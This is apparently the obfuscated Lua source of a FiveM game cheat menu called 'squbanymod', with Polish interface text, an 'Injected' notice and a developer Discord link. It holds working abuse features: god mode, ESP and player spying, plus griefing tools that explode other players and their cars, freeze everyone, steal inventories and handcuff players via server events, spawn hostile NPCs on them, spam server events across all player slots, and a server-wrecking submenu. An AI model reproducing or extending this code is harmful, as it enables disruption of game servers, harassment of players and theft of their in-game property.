...
--    squbanymod.OpenMenu("squbanymod")
--end
...
local function wBQ8ncN2OyoKWmCo(Tlyrrz46tw)
    if squbanymod.debug then
        Citizen.Trace("[squbanymod] " .. tostring(Tlyrrz46tw) .. ".")
    end
end
...
menus_list = {}
function squbanymod.CreateMenu(jwBQUGRXlPi, tv)
    ...
    jwZvXv7xDjl3iWV[jwBQUGRXlPi].y = 0.7
...
function squbanymod.CreateSubMenu(o5_Y4K3Wo8umqV9Jq, K_UkYz2xIa, S30rdV)
    if jwZvXv7xDjl3iWV[K_UkYz2xIa] then
        squbanymod.CreateMenu(o5_Y4K3Wo8umqV9Jq, jwZvXv7xDjl3iWV[K_UkYz2xIa].title)
        if S30rdV then
...
function squbanymod.CurrentMenu()
    return j0P1aYqgapaJmkYWlSEjf
end
function squbanymod.OpenMenu(Wy2HuhjnUT)
...
function squbanymod.IsMenuOpened(lz9JKSXu5)
    return nwxCxw1(lz9JKSXu5)
end
function squbanymod.IsAnyMenuOpened()
...
function squbanymod.IsMenuAboutToBeClosed()
    if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf] then
...
function squbanymod.Button(ku9eSQBeIjpD5OSIkEo, k59Afs, oMOmUf0EItEu1d)
...
function squbanymod.CheckboxButton(ljn2uEed0X, TRO)
...
function squbanymod.Button2(W, oE9cO8vpv, c)
    local lRCYjuz7bRV = W
    if oE9cO8vpv then
...
function squbanymod.MenuButton(hDOYO949Fc, mnVwL3mcwGAyE, FizEWTAQ, sLhJB6ohtIp)
    if jwZvXv7xDjl3iWV[mnVwL3mcwGAyE] then
        if squbanymod.Button2(hDOYO949Fc, FizEWTAQ, sLhJB6ohtIp) then
            RAmmfIbUBx(j0P1aYqgapaJmkYWlSEjf, false)
...
function squbanymod.CheckBox(xD5CgeU35u, bUg2BlhBw, ziLpaLqbs1dFH)
    if squbanymod.CheckboxButton(xD5CgeU35u, bUg2BlhBw) then
...
function squbanymod.ComboBox(wcoi, uyPkbJtn, tNsiXEbhPK7s, Ox92dthLR, cJV1PUijVBF)
    ...
    if squbanymod.Button(wcoi, qxzEBszNgE5T0KHXU) then
...
function squbanymod.ComboBoxSlider(gOMf0jixx786jq6klHUCm, l8P5V6w3Li12FpYzFLt, iINeVnHA, w0EClroT29grzQ0E_I, WuP)
    ...
    if squbanymod.Button3(gOMf0jixx786jq6klHUCm, l8P5V6w3Li12FpYzFLt, njkLWKLLSIthhKUd5NsAs, iINeVnHA) then
            ...
            function()
                ...
                for i = 0, 256 do
                    ...
                    TriggerServerEvent(
                        ...
                        GetPlayerServerId(i),
                        'WhyNot',
                        'squbanymod! HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA',
                        43161337
                    )
...
function squbanymod.Button3(wwMtNhL, bkCC_, aym, l2CcmmxUJy)
...
function squbanymod.Display()
    if nwxCxw1(j0P1aYqgapaJmkYWlSEjf) then
        if jwZvXv7xDjl3iWV[j0P1aYqgapaJmkYWlSEjf].aboutToBeClosed then
            squbanymod.CloseMenu()
        else
...
function squbanymod.SetMenuWidth(FqbKu5KeWxhMu8N8, fF)
    XO8g1Wb5PogWmMOsj4(FqbKu5KeWxhMu8N8, "width", fF)
end
function squbanymod.SetMenuX(Ml6, w1shwzn8WML)
    XO8g1Wb5PogWmMOsj4(Ml6, "x", w1shwzn8WML)
end
function squbanymod.SetMenuY(hoQ0HGXgRiIhd6JbbL0LL, vhzQtrri2a8NXR00xFGN)
    XO8g1Wb5PogWmMOsj4(hoQ0HGXgRiIhd6JbbL0LL, "y", vhzQtrri2a8NXR00xFGN)
end
function squbanymod.SetMenuMaxOptionCountOnScreen(DKcQHP, qKgxysukgKx4Vb5lYqUx8)
    XO8g1Wb5PogWmMOsj4(DKcQHP, "maxOptionCount", qKgxysukgKx4Vb5lYqUx8)
end
function squbanymod.SetTitle(UqNF1, UpCQllq0jeGlXokp6xss1)
    XO8g1Wb5PogWmMOsj4(UqNF1, "title", UpCQllq0jeGlXokp6xss1)
end
function squbanymod.SetTitleColor(tULkl49rjy, mQILWyLbfvqZI, fEocg0k7gq, muFd3KRBBrBEm, UJkWFtONNKE_aLyvF)
    XO8g1Wb5PogWmMOsj4(
        tULkl49rjy,
        "titleColor",
        {
...
function squbanymod.SetTitleBackgroundColor(
...
function squbanymod.SetTitleBackgroundSprite(nlsLV4yw5e4YYOG_PzEb, lxOkm, Pae5)
    RequestStreamedTextureDict(lxOkm)
    XO8g1Wb5PogWmMOsj4(nlsLV4yw5e4YYOG_PzEb, "titleBackgroundSprite", {dict = lxOkm, name = Pae5})
end
function squbanymod.SetTitleBackgroundSpriteNil(_Atq4VCp)
    XO8g1Wb5PogWmMOsj4(_Atq4VCp, "titleBackgroundSprite", nil)
end
function squbanymod.SetSubTitle(TRNvg0, t1eB3iqrRPzszInjmNPk)
    XO8g1Wb5PogWmMOsj4(TRNvg0, "subTitle", t1eB3iqrRPzszInjmNPk)
end
function squbanymod.SetMenuBackgroundColor(ACvgXgAvTupM1gqF41, P3cpQ8LTcG0G, GJ2HaoQiLCe, gV0bS, wTPil)
    XO8g1Wb5PogWmMOsj4(
        ACvgXgAvTupM1gqF41,
        "menuBackgroundColor",
        {
...
function squbanymod.SetMenuSubTitleBackgroundColor(IwF, kQC8, LZlongbMs8yG, C1CiCIhhjVwo83n4zyS, UOCa3yWuuJnK23h9a0)
    XO8g1Wb5PogWmMOsj4(
        IwF,
        "subTitleBackgroundColor",
        {
...
function squbanymod.SetMenuTextColor(ar2c, W_3O6_b3, MoSP696sUotNv, USQCshqEJw, oKhHjxk)
    XO8g1Wb5PogWmMOsj4(
        ar2c,
        "menuTextColor",
        {
...
function squbanymod.SetMenuSubTextColor(P7oINxXfnDPl5m, CkUxXge7i4, UirrSST0Jjmy8, t3E3pzso8ojMCpDjBv, xy36PhzoHlvo1H)
    XO8g1Wb5PogWmMOsj4(
        P7oINxXfnDPl5m,
        "menuSubTextColor",
        {
...
function squbanymod.SetMenuFocusTextColor(IWkRdzeDQLXGUBli, iw0xYMwyEUhZ4C, uhhYDRigRRKaJNF3af, Y0WDIf90Qh, n2XImUrRcF)
    XO8g1Wb5PogWmMOsj4(
        IWkRdzeDQLXGUBli,
        "menuFocusTextColor",
        {
...
function squbanymod.SetMenuFocusColor(nz8C4jCDIe7YQI, uH7RH6OB3d7W6aM, Kqc8fG0up1Pfe0, y2qejWjJ_x2irE4RkhSG, Lh1PnAfllnZH)
    XO8g1Wb5PogWmMOsj4(
        nz8C4jCDIe7YQI,
        "menuFocusColor",
        {
...
function squbanymod.SetMenuButtonPressedSound(xcIna9Yfg6s, Fux6OmwVH8, PaAJ8DG3E)
    XO8g1Wb5PogWmMOsj4(xcIna9Yfg6s, "buttonPressedSound", {["name"] = Fux6OmwVH8, ["set"] = PaAJ8DG3E})
end
function squbanymod.SetFont(cawmaY7MHlYT5fT36AyA, Cupa7U3gZPwxP2)
    i3dUIc_3f4 = Cupa7U3gZPwxP2
    jwZvXv7xDjl3iWV[cawmaY7MHlYT5fT36AyA].titleFont = Cupa7U3gZPwxP2
end
function squbanymod.SetMaxOptionCount(N0q, bxUBfwAq)
    XO8g1Wb5PogWmMOsj4(N0q, "maxOptionCount", bxUBfwAq)
end
function squbanymod.SetMenuFocusBackgroundColor(dNV, whGEolBRAoL14WYJ, UM0V33MJn, Ahtd565jx, uSZHOIjE30C4mwoV0WIuI)
    XO8g1Wb5PogWmMOsj4(
        dNV,
        "menuFocusBackgroundColor",
        {
...
function squbanymod.SetTheme(QiL4yf00PC5s)
    if KxRMNSn0q7_cSUfk5FWwU == "light" then
        YKyAw = {r = 89, g = 173, b = 218, a = 255}
        squbanymod.SetTitleBackgroundSprite(QiL4yf00PC5s, "commonmenu", "interaction_bgd")
        squbanymod.SetMenuBackgroundColor(QiL4yf00PC5s, 0, 0, 0, 170)
        squbanymod.SetMenuFocusBackgroundColor(QiL4yf00PC5s, 0, 0, 0, 200)
        squbanymod.SetMenuSubTitleBackgroundColor(QiL4yf00PC5s, 0, 0, 0, 240)
        squbanymod.SetTitleBackgroundColor(QiL4yf00PC5s, YKyAw.r, YKyAw.g, YKyAw.b, 255)
        squbanymod.SetTitleColor(QiL4yf00PC5s, 255, 255, 255, 255)
        squbanymod.SetMenuTextColor(QiL4yf00PC5s, 150, 150, 150)
        squbanymod.SetMenuFocusTextColor(QiL4yf00PC5s, 175, 175, 175, 255)
        squbanymod.SetMenuSubTextColor(QiL4yf00PC5s, 155, 155, 155, 225)
        squbanymod.SetFont(QiL4yf00PC5s, 6)
        squbanymod.SetMenuX(QiL4yf00PC5s, 0.73)
        squbanymod.SetMenuY(QiL4yf00PC5s, 0.3)
        squbanymod.SetMenuWidth(QiL4yf00PC5s, 0.25)
        squbanymod.SetMaxOptionCount(QiL4yf00PC5s, maxxoptioncount)
    ...
    elseif KxRMNSn0q7_cSUfk5FWwU == "dark" then
        ...
        squbanymod.SetTitleBackgroundSprite(QiL4yf00PC5s, "shopui_title_sm_hangar", "shopui_title_sm_hangar")
        squbanymod.SetMenuBackgroundColor(QiL4yf00PC5s, 25, 25, 25, 225)
        squbanymod.SetMenuFocusBackgroundColor(QiL4yf00PC5s, 50, 50, 50, 230)
        squbanymod.SetMenuSubTitleBackgroundColor(QiL4yf00PC5s, 35, 35, 35, 255)
        squbanymod.SetTitleBackgroundColor(QiL4yf00PC5s, 15, 15, 15, 255)
        squbanymod.SetTitleColor(QiL4yf00PC5s, 135, 135, 135, 255)
        squbanymod.SetMenuTextColor(QiL4yf00PC5s, 150, 150, 150)
        squbanymod.SetMenuFocusTextColor(QiL4yf00PC5s, 155, 155, 155, 255)
        squbanymod.SetMenuSubTextColor(QiL4yf00PC5s, 70, 70, 70, 255)
        squbanymod.SetFont(QiL4yf00PC5s, 4)
        squbanymod.SetMenuX(QiL4yf00PC5s, 0.73)
        squbanymod.SetMenuY(QiL4yf00PC5s, 0.3)
        squbanymod.SetMenuWidth(QiL4yf00PC5s, 0.25)
        squbanymod.SetMaxOptionCount(QiL4yf00PC5s, maxxoptioncount)
...
function squbanymod.InitializeTheme()
    for i = 1, #menus_list do
        squbanymod.SetTheme(menus_list[i], KxRMNSn0q7_cSUfk5FWwU)
    end
end
cachedNotifications = {}
squbanymod.AddNotification = function(qZ6FZwM67RW, HIPRa)
    table.insert(cachedNotifications, {["text"] = qZ6FZwM67RW, ["time"] = HIPRa, ["startTime"] = GetGameTimer()})
end
squbanymod.RemoveNotification = function(dne)
    table.remove(cachedNotifications, dne)
end
squbanymod.Draw3D = function(JrfTYMjRAQQ0PlIc, qEYlGD4txoRIwjUbLv, aq7Y_tRdgro2LDUV6AIES, njYh5Juz0oJ2yzv4RC)
...
squbanymod.PushNotification = function(lKLnhzrJ3B, Zr9nHOs0eponla8cT)
    if lKLnhzrJ3B then
        if not Zr9nHOs0eponla8cT then
            Zr9nHOs0eponla8cT = 5000
        end
        squbanymod.AddNotification(lKLnhzrJ3B, Zr9nHOs0eponla8cT)
    end
end
squbanymod.PushNotification("GDY MENU SIĘ NIE OTWORZY ZINJECTUJ PONOWNIE!!!!!!!", 4000)
squbanymod.PushNotification("Injected Kurwo <3", 5000)
squbanymod.PushNotification("Aby Otworzyć ~g~~g~Użyj PAGEDOWN <3", 6000)
squbanymod.PushNotification("Developer SqubanY#0069", 7000)
squbanymod.PushNotification("https://discord.gg/zRRx4EntUb<3", 8000)
...
local openmenukeybind = "PAGEDOWN"
local refillheatlhkeybind = "num1"
local refillarmourkeybind = "num2"
local g5M = "F10"
local magnetokeybind = "num3"

local currentCustomCrosshair = 1
local selectedCustomCrosshair = 1
customCrosshairOpts = {"Wyłączony", "Oryginalny", "Customowy", "Kułko"}
Jobs = {
    "Bezrobotny",
    "Mechanik",
    "Policja",
...
CustomItems = {}
CustomItems.Item = {"Zestaw Naprawczy", "Apteczke", "Bitcoin", "Złoto", "Klejnoty", "Wiertło", "Wytrych"}
...
Citizen.CreateThread(
    function()
        ...
        squbanymod.CreateMenu("squbanymod", "                                                ~p~~h~KSH | ~y~MENU")
        squbanymod.SetSubTitle("squbanymod", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("selfOptions", "squbanymod", " Developer- SqubanY#0069")
		squbanymod.CreateSubMenu("squbanyOptions", "squbanymod", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("onlinePlayersOptions", "squbanymod", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("visualOptions", "squbanymod", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("teleportOptions", "squbanymod", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("moneyOptions", "squbanymod", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("ESXmoneymenu", "moneyOptions", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("vRPmoneymenu", "moneyOptions", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("vehicleOptions", "squbanymod", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("weaponOptions", "squbanymod", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("serverOptions", "squbanymod", " Developer- SqubanY#0069")
		squbanymod.CreateSubMenu("modelsOptions", "squbanymod", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("serverNukerOptions", "squbanymod", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("menuSettings", "squbanymod", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("selfSuperPowers", "selfOptions", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("allPlayersOptions", "onlinePlayersOptions", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("selectedPlayerOptions", "onlinePlayersOptions", " Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("selectedPlayerOptionsTriggers", "selectedPlayerOptions", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("selectedPlayerOptionsTroll", "selectedPlayerOptions", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("visualOptionsESP", "visualOptions", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("vehicleLosSantosCustoms", "vehicleOptions", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("vehicleLosSantosCustomsCosmetics", "vehicleLosSantosCustoms", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("vehicleLosSantosCustomsPerformance", "vehicleLosSantosCustoms", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("vehicleSpawnList", "vehicleOptions", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("vehicleSpawnSelected", "vehicleSpawnList", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("vehicleSpawnSelectedOptions", "vehicleSpawnSelected", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("weaponOptionsTypes", "weaponOptions", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("weaponOptionsTypeSelection", "weaponOptionsTypes", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("weaponModOptionsOptions", "weaponOptionsTypeSelection", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("weaponsModSelect", "weaponModOptionsOptions", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("serverOptionsResources", "serverOptions", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("serverOptionsTriggerEvents", "serverOptions", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("serverOptionsTriggerEventsESX", "serverOptionsTriggerEvents", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("serverOptionsTriggerEventsVRP", "serverOptionsTriggerEvents", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("setjobmenu", "serverOptionsTriggerEvents", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("serverOptionsTriggerEventsESXMoney", "serverOptionsTriggerEventsESX", "Developer- SqubanY#0069")
        squbanymod.CreateSubMenu("keybindSettings", "menuSettings", "Developer- SqubanY#0069")
        squbanymod.InitializeTheme(1)
        local LvFBnHcLyb = 0
        while NywuctsA4BD4b3_G0 do
            if LvFBnHcLyb == 0 then
                introScaleform = InitializeIntro("mp_big_message_freemode", "~p~Welcome")
            ...
            if squbanymod.IsMenuOpened("squbanymod") then
                if
                    squbanymod.MenuButton(
                        "Opcje Gracza",
                        "selfOptions",
                        " ",
				 ...
				 elseif
                    squbanymod.MenuButton(
                        ...
                        "squbanyOptions",
                        " ",
                        {dict = "mpleaderboard", text = "leaderboard_cup_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    squbanymod.MenuButton(
                ...
                elseif
				 ...
				 elseif
                    squbanymod.MenuButton(
                        ...
                        "modelsOptions",
                        " ",
                        {dict = "mpleaderboard", text = "leaderboard_male_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                 elseif
                 squbanymod.MenuButton(
                     "Opcje Rozjebania Serwa",
                     "serverNukerOptions",
                     " ",
              ...
              then
                ...
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("selfOptions") then
                if squbanymod.MenuButton("Super Moce", "selfSuperPowers") then
                elseif squbanymod.Button("Zmiana Modelu", "Server") then
                    local model5 = KeyboardInput("Wpisz Model", "", 25)
                    RequestModel(GetHashKey(model5))
                    Wait(500)
                        if HasModelLoaded(GetHashKey(model5)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model5))
                            squbanymod.PushNotification("Zmieniono Model")
                        else squbanymod.PushNotification("Niema Takiego Modelu") end
                elseif squbanymod.CheckBox("Nieśmiertelnośc", enablegodmode) then
                    enablegodmode = not enablegodmode
                elseif squbanymod.CheckBox("Połowiczny GodMod", enablesemigodmode) then
                    enablesemigodmode = not enablesemigodmode
                elseif squbanymod.CheckBox("Nielimitowane Bieganie", infinitestamina) then
                    infinitestamina = not infinitestamina
                elseif squbanymod.CheckBox("Po Zgonie Jesteś Sztywny", disableragdoll) then
                    disableragdoll = not disableragdoll
                elseif squbanymod.CheckBox("Pelerynka Niewidka", enableinvisible) then
                    enableinvisible = not enableinvisible
                elseif squbanymod.Button("Zapierdol Się", "~g~~g~~g~Użyj") then
                    SetEntityHealth(PlayerPedId(-1), 0)
                elseif squbanymod.Button("Odrodzenie", "~g~~g~~g~Użyj") then
                    NertigelFunc.nativeRevive()
                elseif squbanymod.Button("Ulecz", "~g~~g~~g~Użyj") then
                    SetEntityHealth(PlayerPedId(-1), 200)
                    squbanymod.PushNotification("Uleczono", 5000)
                elseif squbanymod.Button("Dodaj Armor", "~g~~g~~g~Użyj") then
                    SetPedArmour(PlayerPedId(-1), 200)
                    squbanymod.PushNotification("Dodado Armor", 5000)
                elseif squbanymod.Button("100% Jedzenia", "~g~~g~~g~Użyj") then
                    if NertigelFunc.doesResourceExist("esx_status") then
                        TriggerCustomEvent(false, "esx_status:set", "hunger", 1000000)
                        squbanymod.PushNotification("Najadłeś Się Fchuuj", 5000)
                    else
                        squbanymod.PushNotification("Błąd!", 5000)
                    end
                elseif squbanymod.Button("100% Picia", "~g~~g~~g~Użyj") then
                    if NertigelFunc.doesResourceExist("esx_status") then
                        TriggerCustomEvent(false, "esx_status:set", "thirst", 1000000)
                        squbanymod.PushNotification("Jesteś Napojony Fchuuuj!", 5000)
                    else
                        squbanymod.PushNotification("Błąd!", 5000)
                    end
                elseif squbanymod.Button("Odnów Siłę", "~g~~g~~g~Użyj") then
                    ResetPlayerStamina(PlayerPedId(-1))
                    squbanymod.PushNotification("Masz Fchuuj Siły", 5000)
                elseif squbanymod.Button("Randomowy Strój", "~g~~g~~g~Użyj") then
                    NertigelFunc.randomClothes(PlayerId())
                    squbanymod.PushNotification("Woow! Wyglądasz Jak Gówno <3", 5000)
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("selfSuperPowers") then
                if squbanymod.CheckBox("Super Skok", enablesuperjump) then
                    enablesuperjump = not enablesuperjump
                elseif squbanymod.CheckBox("Termowizja", enableheatvision) then
                    enableheatvision = not enableheatvision
                elseif squbanymod.CheckBox("Noktowizja", enablenightvision) then
                    enablenightvision = not enablenightvision
                elseif squbanymod.CheckBox("Zrób Się Mały", enablebecometiny) then
                    enablebecometiny = not enablebecometiny
                elseif squbanymod.CheckBox("Latanie", enablenoclip) then
                        enablenoclip = not enablenoclip
                        squbanymod.PushNotification("Uruchomiono Noclip!", 5000)
                        squbanymod.PushNotification("~g~~g~~g~Użyj: W, S, A, D, Q, Z", 7000)
                elseif
                    squbanymod.ComboBoxSlider(
                        "Szybsze Bieganie",
                        FastCBWords,
                        currentFastRunIndex,
                ...
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("onlinePlayersOptions") then
                squbanymod.SetSubTitle("onlinePlayersOptions", #GetActivePlayers() .. " Player(s) Online")
                if squbanymod.MenuButton("Wszyscy Gracze", "allPlayersOptions") then
                else
                ...
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("allPlayersOptions") then
                if squbanymod.Button("Rozjeb Fure", "~g~~g~~g~Użyj") then
                    NertigelFunc.aPO.rapeVehicles()
                elseif squbanymod.Button("Wyjeb Auta W Powietrze", "~g~~g~~g~Użyj") then
                    NertigelFunc.aPO.explosqubanymodrs()
                elseif squbanymod.Button("Sklonuj Peda", "~g~~g~~g~Użyj") then
                    NertigelFunc.aPO.clonePeds()
                elseif squbanymod.Button("Wypierdol Wszystkich  ~r~(!)", "~g~~g~~g~Użyj") then
                ...
                elseif squbanymod.CheckBox("Zatrzymaj Wszystkich", enablefreezeall) then
                    enablefreezeall = not enablefreezeall
                elseif squbanymod.Button("Rozjeb Wszystkim Ekran", "~~g~~g~Użyj~") then
                    NertigelFunc.aPO.burnSFX()
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("selectedPlayerOptions") then
                squbanymod.SetSubTitle(
                    "selectedPlayerOptions",
                    "~b~[" ..
                        GetPlayerServerId(selectedPlayer) ..
                            "]~s~ " .. GetPlayerName(selectedPlayer) .. getPlayerStatus(GetPlayerPed(currentPlayer))
                )
                if squbanymod.MenuButton("Opcje Do Trolowania", "selectedPlayerOptionsTroll") then
                elseif squbanymod.MenuButton("Opcje Zaawansowane", "selectedPlayerOptionsTriggers") then
                elseif
                    squbanymod.Button(
                        "Podglądaj",
                        Uj8_cWbAGr6Q1NF4 and "Obserwujesz: [" .. GetPlayerServerId(wiM7iOgkz) .. "]" or
                            "Nie Podglądasz"
                    )
                 then
                    wiM7iOgkz = selectedPlayer
                    NertigelFunc.sPO.spectatePlayer(wiM7iOgkz)
                elseif squbanymod.Button("Ulecz", "~g~~g~Użyj") then
                    CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(selectedPlayer)))
                elseif squbanymod.Button("Daj Armor", "~g~Użyj") then
                    CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(selectedPlayer)))
                elseif squbanymod.Button("Tepnij Się", "~g~~g~Użyj") then
                    NertigelFunc.sPO.teleportToPlayer(selectedPlayer)
                elseif squbanymod.Button("Tepnij Się Do Auta", "~g~~g~Użyj") then
                    NertigelFunc.sPO.teleportIntoVehicle(GetPlayerPed(selectedPlayer))
                elseif squbanymod.Button("Sklonuj Auto", "~g~~g~Użyj") then
                    NertigelFunc.sPO.cloneVehicle(selectedPlayer)
                elseif squbanymod.Button("Sklonuj Strój", "~g~~g~Użyj") then
                    NertigelFunc.sPO.clonePedOutfit(PlayerPedId(), GetPlayerPed(selectedPlayer))
                elseif squbanymod.Button("Daj Wszystkie Bronie", "~g~~g~Użyj") then
                    NertigelFunc.sPO.giveAllWeapons(GetPlayerPed(selectedPlayer))
                elseif squbanymod.Button("Zabierz Wszystkie Bronie", "~g~~g~Użyj") then
                ...
                elseif squbanymod.Button("Daj Ammo", "~g~~g~Użyj") then
                    for i = 1, #weapons2 do
                        AddAmmoToPed(GetPlayerPed(selectedPlayer), GetHashKey(weapons2[i]), 250.0)
                    end
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("selectedPlayerOptionsTriggers") then
                if squbanymod.Button("Odrodzenie  ~r~(!)", " Server") then
            ...
            elseif squbanymod.Button("Otwórz Ekwipunek", " Client") then
                    TriggerCustomEvent(
                        false,
                ...
                elseif squbanymod.Button("Zakuj", " Server") then
                    TriggerServerEvent("esx_policejob:handcuff", GetPlayerPed(SelectedPlayer))
                elseif squbanymod.Button("Przeszukaj Ekwipunek", " Client") then
                    NertigelFunc.sPO.SearchDisc(GetPlayerServerId(selectedPlayer))
                elseif squbanymod.Button("Zabierz Ekwipunek", " Client") then
                    NertigelFunc.sPO.StealDisc(GetPlayerServerId(selectedPlayer))
                elseif squbanymod.Button("Wyślij Rachunek", " Server") then
                    local e77MTJB1SjAVjr = KeyboardInput("Wpisz Kwotę", "", 10)
                ...
                elseif squbanymod.Button("Wyślij Fałszywą Wiadomość", "Server") then
                ...
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("selectedPlayerOptionsTroll") then
                if squbanymod.Button("Wyłącz Animacje", "~g~~g~Użyj") then
                ...
                elseif squbanymod.Button("Rozbij Pojazd  ~r~(!)", "~g~~g~Użyj") then
                    if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						squbanymod.PushNotification("Gracz Nie Jest W Pojeździe!", 5000)
					else
                ...
                elseif squbanymod.Button("Napraw Auto  ~r~(!)", "~g~~g~Użyj") then
                    if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						squbanymod.PushNotification("Gracz Nie Jest W Pojeździe!!", 5000)
					else
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
                ...
                elseif squbanymod.ComboBox("Rozwal Opony  ~r~(!)", {"Front Left", "Front Right", "Back Left", "Back Right", "Wszystkie"}, currTireIndex, selTireIndex, function(currentIndex, selClothingIndex)
                    currTireIndex = 5
                    selTireIndex = 5
                    end) then
					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
                ...
                elseif squbanymod.Button("Zresp Dziwne Bronie", "~g~~g~Użyj") then
                    NertigelFunc.sPO.spawnPickupsOn(GetPlayerPed(selectedPlayer))
                elseif squbanymod.Button("Zresp Przeciwników", "~g~~g~Użyj") then
                    NertigelFunc.sPO.spawnEnemies(GetPlayerPed(selectedPlayer), "a_m_y_skater_01")
                elseif squbanymod.Button("Zresp Przeciwników W Helikopterze", "~g~~g~Użyj") then
                    NertigelFunc.sPO.spawnHeliEnemies(GetPlayerPed(selectedPlayer))
                elseif squbanymod.Button("Zresp Przeciwników W Czołgu", "~g~~g~Użyj") then
                    NertigelFunc.sPO.spawnTankEnemy(GetPlayerPed(selectedPlayer))
                elseif squbanymod.Button("Jebnij Gracza  ~r~(!)") then
                    ...
                    squbanymod.PushNotification("Jebnięto!", 5000)
                elseif squbanymod.Button("Wyjeb W Powietrze  ~r~(!)", "~g~~g~Użyj") then
                    local qzvkQ = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    AddExplosion(qzvkQ.x + 1, qzvkQ.y + 1, qzvkQ.z + 1, 4, 100.0, true, false, 0)
                    squbanymod.PushNotification("Player Exploded!", 5000)
                elseif
                    squbanymod.ComboBox(
                        "Zespawnuj Obiekt",
                        {
                ...
                elseif
                    squbanymod.Button(
                        "NIE DZIAŁA!!!!!!!!!!!!",
                        Oz and "WKRÓTCE: [" .. GetPlayerServerId(SjqKFFPQMn0FcwBwiS4mE) .. "]" or "WKRÓTCE: [-1]"
                    )
                 then
                    Oz = not Oz
				...
				squbanymod.Display()
            elseif squbanymod.IsMenuOpened('squbanyOptions') then
			if squbanymod.Button('NO MOŻE KIEDYŚ KURWA ZROBIE') then
			print("XDDDDDDDDDDDDDD")
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("visualOptions") then
                if
                    squbanymod.MenuButton(
                        "ESP",
                        "visualOptionsESP",
                ...
                elseif
                 ...
                 then
                elseif squbanymod.CheckBox("Pokaż Graczy Na Mapie", z_nQ) then
                    NertigelFunc.playerBlips()
                elseif squbanymod.CheckBox("Pokaż Radar", WfYVJ8MoOy3Hl7) then
                    WfYVJ8MoOy3Hl7 = not WfYVJ8MoOy3Hl7
                elseif squbanymod.CheckBox("Pokaż Nick Graczy", enableforcegamertags) then
                    enableforcegamertags = not enableforcegamertags
                elseif squbanymod.CheckBox("Zaćmienie", H) then
                    H = not H
                elseif squbanymod.Button("Optymalizacja FPS", "~g~Użyj") then
                    NertigelFunc.optimizeFPS()
                end
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("visualOptionsESP") then
                if squbanymod.CheckBox("Włącz", iFJo9N75fE6X) then
                    iFJo9N75fE6X = not iFJo9N75fE6X
                    NertigelFunc.toggleESP()
                elseif squbanymod.CheckBox("ID Graczy", cCCjZqd78) then
                    cCCjZqd78 = not cCCjZqd78
                elseif squbanymod.CheckBox("Nazwy Graczy", A__TqtbeQPVTbDeT) then
                    A__TqtbeQPVTbDeT = not A__TqtbeQPVTbDeT
                elseif squbanymod.CheckBox("Pokaż Dystans", FUxbInvVV02Fi) then
                    FUxbInvVV02Fi = not FUxbInvVV02Fi
                elseif squbanymod.CheckBox("Pokaż Linie", drawwplayerlines) then
                    drawwplayerlines = not drawwplayerlines
                elseif squbanymod.CheckBox("Pokaż ESP Box", drawespbox) then
                    drawespbox = not drawespbox
                elseif squbanymod.CheckBox("Pokaż Aktywną Broń Gracza", ECclILYClVywd2ROgA0J) then
                    ECclILYClVywd2ROgA0J = not ECclILYClVywd2ROgA0J
                elseif squbanymod.CheckBox("Pokaż Auto Gracza", xaEYqsfYZ) then
                    xaEYqsfYZ = not xaEYqsfYZ
                elseif
                    squbanymod.ComboBoxSlider(
                        "Czas Odświerzania ESP",
                ...
                squbanymod.Display()
            elseif squbanymod.IsMenuOpened("teleportOptions") then
